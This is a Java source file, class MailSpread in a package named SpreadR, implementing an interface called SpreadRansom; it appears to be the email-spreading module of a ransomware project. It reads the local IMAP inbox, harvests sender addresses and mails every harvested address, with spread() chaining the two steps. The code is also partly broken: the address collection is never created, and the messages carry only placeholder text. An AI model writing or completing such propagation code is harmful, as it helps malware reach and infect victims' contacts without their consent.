package SpreadR;

import java.util.Collection;
import java.util.*;
import javax.mail.*;
import javax.mail.internet.*;

public class MailSpread implements SpreadRansom {

	@SuppressWarnings("null")
	public Collection<String> scanEmailAdress() {
		Properties props = new Properties();
		String host = "localhost";
		String username = null;
		String password = null;

		// String provider = "pop3";
		String provider = "imap";

		// Collection of Mail addresses
		Collection<String> emails = null;

		try {
			// Connect to the server
			Session session = Session.getDefaultInstance(props, null);
			Store store = session.getStore(provider);
			store.connect(host, username, password);

			// open the in-box folder
			Folder inbox = store.getFolder("INBOX");
			inbox.open(Folder.READ_ONLY);

			// get a list of java mail messages as an array of messages
			Message[] messages = inbox.getMessages();

			for (int i = 0; i < messages.length; i++) {
				String from = getFrom(messages[i]);
				if (from != null) {
					from = removeQuotes(from);
					emails.add(from);
				}
			}
			Iterator<String> it = emails.iterator();
			while (it.hasNext()) {
				System.out.println("from: " + it.next());
			}

			// close the in-box folder but do not
			// remove the messages from the server
			inbox.close(false);
			store.close();

		} catch (NoSuchProviderException nspe) {
			System.err.println("invalid provider name");

		} catch (MessagingException me) {
			System.err.println("messaging exception");

			me.printStackTrace();
		}
		return emails;
	}

	private static String getFrom(Message javaMailMessage) throws MessagingException {
		String from = "";
		Address a[] = javaMailMessage.getFrom();
		if (a == null)
			return null;
		for (int i = 0; i < a.length; i++) {
			Address address = a[i];
			from = from + address.toString();
		}

		return from;
	}

	private static String removeQuotes(String stringToModify) {
		int indexOfFind = stringToModify.indexOf(stringToModify);
		if (indexOfFind < 0)
			return stringToModify;

		StringBuffer oldStringBuffer = new StringBuffer(stringToModify);
		StringBuffer newStringBuffer = new StringBuffer();
		for (int i = 0, length = oldStringBuffer.length(); i < length; i++) {
			char c = oldStringBuffer.charAt(i);
			if (c == '"' || c == '\'') {
				// do nothing
			} else {
				newStringBuffer.append(c);
			}

		}
		return new String(newStringBuffer);
	}

	public void sendMails(Collection<String> emailsAdresses) {
		// Sender's email ID needs to be mentioned
		String from = " ";

		// Assuming you are sending email from localhost
		String host = "localhost";

		// Get system properties
		Properties properties = System.getProperties();

		// Setup mail server
		properties.setProperty("mail.smtp.host", host);

		// Get the default Session object.
		Session session = Session.getDefaultInstance(properties);

		try {
			// Create a default MimeMessage object.
			MimeMessage message = new MimeMessage(session);

			// header field of the header.
			message.setFrom(new InternetAddress(from));

			// header field
			message.setSubject("This is the Subject Line!");

			// actual message
			message.setText("This is actual message");

			for (String to : emailsAdresses) // Recipient's email ID needs to be mentioned.
			{
				// header field of the header.
				message.addRecipient(Message.RecipientType.TO, new InternetAddress(to));

				// Send message
				Transport.send(message);
			}

		} catch (MessagingException mex) {
			mex.printStackTrace();
		}
	}

	@Override
	public void spread() {

		Collection<String> adresses = scanEmailAdress();
		sendMails(adresses);

	}

}